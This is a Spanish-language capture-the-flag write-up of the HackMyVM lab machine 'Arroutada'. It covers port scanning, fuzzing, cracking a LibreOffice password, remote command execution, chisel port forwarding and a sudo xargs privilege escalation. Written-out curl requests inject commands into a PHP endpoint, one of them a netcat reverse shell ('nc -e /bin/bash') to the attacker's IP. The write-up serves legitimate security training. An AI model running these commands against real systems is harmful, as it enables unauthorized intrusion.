---
layout      : post
title       : "Arroutada - HackMyVm"
author      : elc4br4
image       : assets/images/HMV/Arroutada-HackMyVM/Arroutada.webp
optimized_image : assets/images/HMV/Arroutada-HackMyVM/Arroutada.webp
category    : [ HackMyVM ]
tags        : [ Linux ]
description : En esta ocasión resolvemos la máquina **Arroutada** creada por Rijaba1 que está disponible en la plataforma de **HackmyVm**.
---

En esta ocasión resolvemos la máquina **Arroutada** creada por Rijaba1 que está disponible en la plataforma de **HackmyVm**.

**Un pequeño INDICE**

1. [Reconocimiento](#reconocimiento).
2. [Explotación](#explotación).
3. [Escalada de Privilegios](#priv-esc).

***

# Reconocimiento [#](reconocimiento) {#reconocimiento}

Comenzamos como siempre lanzando **nmap** para realizar un reconocimiento de puertos.

`nmap -p- -Pn -n --min-rate 5000 192.168.0.30`

![](/assets/images/HMV/Arroutada-HackMyVM/Untitled.png)

A continuación lanzo una serie de scripts básicos de nmap (sC) y el parámetro sV para descubrir los servicios y versiones que corren en cada puerto, en este caso solo en el puerto 80, ya que es el único puerto abierto.

`nmap -p80 -sCV -n -Pn 192.168.0.30`

![](/assets/images/HMV/Arroutada-HackMyVM/Untitled%201.png)

Tenemos un servidor **apache httpd 2.4.54** y poco más, por lo que comienzo a enumerar.

# Explotación [#](explotación) {#explotación}

Tras acceder desde el navegador encontré lo siguiente:

![](/assets/images/HMV/Arroutada-HackMyVM/Untitled%202.png)

Parece una simple imagen pero podría tener algo escondido por lo que decido descargarla y lanzar herramienta **exiftool** para **analizar los metadatos de la imagen** y buscar posibles pistas.

![](/assets/images/HMV/Arroutada-HackMyVM/Untitled%203.png)

Y encuentro una ruta “**/scout**” por lo que accedo a ella desde el navegador.

![](/assets/images/HMV/Arroutada-HackMyVM/Untitled%204.png)

Vemos otra ruta **/scout/******/docs** pero nos falta descubrir la ruta que hay entre medias, por lo que toca **fuzzear** y para ello usaré **wfuzz**.

![](/assets/images/HMV/Arroutada-HackMyVM/Untitled%205.png)

Y encuentro la ruta **/j2**, por lo que ya tengo la ruta completa asique accedo a la misma desde el navegador.

Al accede encuentro un montón de archivos.

![](/assets/images/HMV/Arroutada-HackMyVM/Untitled%206.png)

En el archivo **pass.txt** no hay nada de interés pero el archivo **shellfile.ods** si me llama la atención, la **extensión .ods** es de **LibreOffice** por lo que lo descargo y lo abro pero me pide contraseña…

![](/assets/images/HMV/Arroutada-HackMyVM/Untitled%207.png)

Para poder craquearlo existe una utilidad de **John The Ripper** llamada **libreofficejohn2.py** con la que puedo generar el hash y craquearlo después.

![](/assets/images/HMV/Arroutada-HackMyVM/Untitled%208.png)

Ahora lo crackeo con John y obtengo la contraseña.

![](/assets/images/HMV/Arroutada-HackMyVM/Untitled%209.png)

**john11** es la contraseña.

Abro el archivo y encuentro esto.

![](/assets/images/HMV/Arroutada-HackMyVM/Untitled%2010.png)

Encuentro otra ruta, esta vez un archivo php, por lo que podría haber un **RCE** asique pruebo a fuzzear de nuevo…

![](/assets/images/HMV/Arroutada-HackMyVM/Untitled%2011.png)

Veo que el parámetro a es el que necesito para ejecutar el RCE pero al intentarlo me arroja otro un error.

![](/assets/images/HMV/Arroutada-HackMyVM/Untitled%2012.png)

Se me ocurre combinar el parámetro **a con el b** y **fuzzear** de nuevo.

![](/assets/images/HMV/Arroutada-HackMyVM/Untitled%2013.png)

Y por suerte lo consigo.

![](/assets/images/HMV/Arroutada-HackMyVM/Untitled%2014.png)

Por lo que ahora intento obtener acceso al sistema introduciendo una **reverse shell en netcat**.

![](/assets/images/HMV/Arroutada-HackMyVM/Untitled%2015.png)

![](/assets/images/HMV/Arroutada-HackMyVM/Untitled%2016.png)

Consigo acceso a la máquina pero primero he de realizar el tratamiento de la tty.

```bash
script /dev/null -c bash
CTRL+Z
stty raw -echo; fg
reset
xterm-256color
export XTERM=xterm-256color
export SHELL=bash
```

Tras **actualizar la tty** echo un vistazo a los usuarios existentes en la máquina y veo que existe el usuario **drito**, por lo que lo primero será migrarme a este usuario asique procedo a enumerar un poco…

Lo primero que hago es buscar **procesos existentes** pero no veo nada que me llame la atención, por lo que mi siguiente paso es buscar algún puerto abierto…

Hago uso del comando **netstat** pero no está instalado en el sistema por lo que pruebo a usar `ss -tulpn` y veo que existe el **puerto 8000** abierto.

![](/assets/images/HMV/Arroutada-HackMyVM/Untitled%2017.png)

Para poder acceder a este puerto he de usar **chisel** o parecidos para poder efectuar un **Port Forwarding**.

Paso el binario de **chisel** a la máquina víctima y efectúo los siguientes comandos.

- En la máquina atacante

![](/assets/images/HMV/Arroutada-HackMyVM/Untitled%2018.png)

- En la máquina víctima

![](/assets/images/HMV/Arroutada-HackMyVM/Untitled%2019.png)

Ahora ya puedo acceder al puerto 8000 desde mi navegador, y encuentro lo siguiente.

![](/assets/images/HMV/Arroutada-HackMyVM/Untitled%2020.png)

Es una cadena ofuscada en Brainfuck, por lo que la desofusco y veo el contenido.

![](/assets/images/HMV/Arroutada-HackMyVM/Untitled%2021.png)

- all HackMyVM hackers!!

Pero no me sirve de nada por lo que regreso al navegador e inspecciono el código fuente por si me he dejado algo por ahí…

Y por suerte encuentro una ruta **/priv.php**

![](/assets/images/HMV/Arroutada-HackMyVM/Untitled%2022.png)

Accedo a la ruta e inspecciono el código fuente

![](/assets/images/HMV/Arroutada-HackMyVM/Untitled%2023.png)

Nos dice que falta un parámetro (command) y podemos ver que el propio parámetro ha de ir en json, por lo que vamos a probar a hacerle una petición POST con curl usando el parámetro command y metiendo la data en json.

Esto lo hago de la siguiente forma:

```bash
curl -X POST "http://127.0.0.1:8000/priv.php" -d ´{"command": "whoami;id;hostname"}´             
```

![](/assets/images/HMV/Arroutada-HackMyVM/Untitled%2024.png)

Al ver que funciona lo que hago es intentar ganar acceso a la máquina a través de una reverse shell en netcat.

```bash
curl -X POST "http://127.0.0.1:8000/priv.php" -d ´{"command": "nc -e /bin/bash 192.168.0.18 1234"}´
```

![](/assets/images/HMV/Arroutada-HackMyVM/Untitled%2025.png)

Consigo ganar acceso a la máquina como el usuario **drito**, por lo que lo siguiente paso es escalar privilegios a root, pero antes como de costumbre lo primero es actualizar la tty.

```bash
script /dev/null -c bash
CTRL+Z
stty raw -echo; fg
reset
xterm-256color
export XTERM=xterm-256color
export SHELL=bash
```
# ESCALADA DE PRIVILEGIOS [#](priv-esc) {#priv-esc}

Tras actualizar la tty lanzo el comando `sudo -l.`

![](/assets/images/HMV/Arroutada-HackMyVM/Untitled%2026.png)

Puedo ejecutar el binario xargs como root sin contraseña por lo que lo primero que se me ocurre al tratarse de un binario es dirigirme a [gtfobins](https://gtfobins.github.io/).

![](/assets/images/HMV/Arroutada-HackMyVM/Untitled%2027.png)

Ejecuto el comando y… me convierto en **root**.

![](/assets/images/HMV/Arroutada-HackMyVM/Untitled%2028.png)

Gracias Rijaba por esta máquina!!!! 